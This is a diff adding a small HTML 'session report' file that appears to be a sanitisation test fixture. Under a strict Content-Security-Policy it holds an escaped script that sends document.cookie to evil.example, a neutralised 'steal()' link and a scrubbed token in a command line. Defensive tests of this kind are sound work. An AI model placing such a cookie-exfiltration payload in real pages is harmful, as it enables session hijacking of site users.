@@ -1,0 +1,14 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta http-equiv="Content-Security-Policy" content="default-src 'none'; style-src 'unsafe-inline'">
+<title>leaky report</title>
+</head>
+<body>
+<h1>session report</h1>
+&lt;script>fetch('https://evil.example/'+document.cookie)&lt;/script>
+<img src="x">
+<a href="blocked:steal()">click</a>
+<code>python train.py --hf-token=hf_<scrubbed></code>
+</body>
+</html>
